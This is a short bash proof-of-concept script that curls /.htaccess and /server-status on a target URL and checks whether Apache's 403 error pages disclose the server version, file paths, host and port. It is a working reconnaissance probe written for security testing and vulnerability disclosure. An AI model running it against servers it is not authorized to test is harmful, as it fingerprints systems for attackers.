#!/bin/bash

# POC: Apache Version and Path Information Disclosure in 403 Error Pages
# Demonstrates that accessing restricted files returns error pages exposing:
# 1. Apache version information
# 2. Exact file paths being requested
# 3. Server location and port information

TARGET_URL="${1:-http://localhost}"

echo "=========================================="
echo "403 Forbidden Error Page Disclosure POC"
echo "=========================================="
echo ""

# Test 1: Access .htaccess file
echo "[*] Test 1: Accessing .htaccess file..."
echo "Request: curl -s -i ${TARGET_URL}/.htaccess"
echo ""

RESPONSE=$(curl -s -i "${TARGET_URL}/.htaccess")
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n +2)

echo "Response Status: $HTTP_STATUS"
echo ""
echo "Response Body:"
echo "$BODY"
echo ""

# Extract and highlight vulnerable information
echo "========== VULNERABLE INFORMATION EXPOSED =========="
echo ""

# Check for Apache version disclosure
if echo "$BODY" | grep -q "Apache/"; then
    APACHE_VERSION=$(echo "$BODY" | grep -oP 'Apache/[^ ]+' | head -1)
    echo "[✓] Apache Version Disclosed: $APACHE_VERSION"
else
    echo "[✗] Apache version not found"
fi

# Check for path disclosure
if echo "$BODY" | grep -q "\.htaccess"; then
    echo "[✓] File Path Disclosed: /.htaccess (file existence confirmed)"
else
    echo "[✗] Path not disclosed"
fi

# Check for server location/port disclosure
if echo "$BODY" | grep -q "localhost"; then
    echo "[✓] Server Location Disclosed: localhost"
fi

if echo "$BODY" | grep -q "Port 80"; then
    echo "[✓] Server Port Disclosed: Port 80"
fi

echo ""
echo "========== DETAILED RESPONSE =========="
echo "$BODY"
echo ""

# Test 2: Try /server-status (another common restricted resource)
echo ""
echo "[*] Test 2: Accessing /server-status file..."
echo "Request: curl -s -i ${TARGET_URL}/server-status"
echo ""

RESPONSE2=$(curl -s -i "${TARGET_URL}/server-status")
HTTP_STATUS2=$(echo "$RESPONSE2" | head -n 1)
BODY2=$(echo "$RESPONSE2" | tail -n +2)

echo "Response Status: $HTTP_STATUS2"
echo ""

# Extract vulnerable information from second test
if echo "$BODY2" | grep -q "403"; then
    echo "[✓] HTTP 403 Forbidden response received"
    
    if echo "$BODY2" | grep -q "Apache/"; then
        echo "[✓] Apache version disclosed in /server-status response"
    fi
    
    if echo "$BODY2" | grep -q "/server-status"; then
        echo "[✓] Path /server-status disclosed (file existence confirmed)"
    fi
fi

echo ""
echo "=========================================="
echo "POC Complete"
echo "=========================================="